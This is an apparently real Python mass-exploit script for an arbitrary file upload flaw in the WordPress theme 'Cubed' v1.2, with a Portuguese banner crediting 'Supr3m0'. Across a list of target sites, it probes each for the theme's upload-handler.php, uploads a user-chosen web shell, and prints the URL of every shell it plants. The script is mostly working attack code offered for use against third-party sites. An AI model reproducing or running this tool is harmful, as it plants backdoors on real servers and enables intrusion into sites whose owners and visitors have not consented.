import colorama
from colorama import Fore as F
import requests as r
import sys

index = """
__  __            __                  ______               
\ \/ /_  ______  / /_____  __________/ ____/_______ _      __
 \  / / / / __ \/ //_/ _ \/ ___/ ___/ /   / ___/ _ \ | /| / /
 / / /_/ / / / / ,< /  __/ /  (__  ) /___/ /  /  __/ |/ |/ / 
/_/\__,_/_/ /_/_/|_|\___/_/  /____/\____/_/   \___/|__/|__/  
          Recoda nao comedia ;)
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
# Wordpress theme "Cubed" (v1.2) Arbitrary Shell Upload
# Mass Exploit by Supr3m0
# Facebook: @yunkers01 ou @yunkers1
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::"""

x = sys.argv
script = x[0]
urls = []
if len(x) == 5:
	lista = x[1]
	ano = x[2]
	mes = x[3]
	arq_user = x[4]
else:
	print(F.GREEN + index)
	print(F.RED + "Use:" + F.WHITE +  " python3 " + script + "sites.txt <ano> <mes> <shell.php>")
	print(F.RED + "Ex:" + F.WHITE +  " python3 " + script + "sites.txt 2017 05 supremo.html")
	exit()

try:
  arquivo = open(lista, "r")
  sites = arquivo.readlines()
except:
  print(F.RED + " Nao consegui abrir o arquivo ",lista, ".")
  exit()
  
print(F.GREEN + index)
tam = len(sites)
print(F.GREEN + "[+]" + F.WHITE + " Total de Sites:",tam)
print(F.GREEN + "[+]" + F.WHITE + " Arquivo:",lista)
print(F.GREEN + "\n[...]" + F.WHITE + " Iniciando...\n")

for url in sites:
  urls.append(url) 
  urls = [url.replace('\n','') for url in urls]

def url_usar(url):
	if url[-1] != "/":
		url = url + "/"
	if url[:7] != "http://" and url[:8] != "https://":
		url = "http://" + url
	return url

shell = open(arq_user, "rb")
for xsite in urls:
	xsite = url_usar(xsite)
	patch = xsite + "wp-content/themes/cubed_v1.2/functions/upload-handler.php"
	checa = r.get(patch)
	if checa.status_code == 200:
		if "404" not in checa.text:
			print(F.GREEN + "Vulneravel:" +  F.WHITE + " " + xsite)
			print(F.GREEN + "[*]" + F.WHITE + " Inserindo payload...")
			payload = {"uploadfile" : shell}
			injeta = r.post(patch, files=payload)
			shell_dir = xsite + "wp-content/uploads/" + ano + "/" + mes + "/" + arq_user
			checa_shell = r.get(shell_dir)
			if checa_shell.status_code == 200:
				print(F.GREEN + "Shell: " + F.WHITE + shell_dir)
			else:
				print(F.YELLOW + injeta.text)
		else:
			print(F.RED + "Fail:" +  F.WHITE + " " + xsite)
	else:
		print(F.RED + "Fail:" +  F.WHITE + " " + xsite)
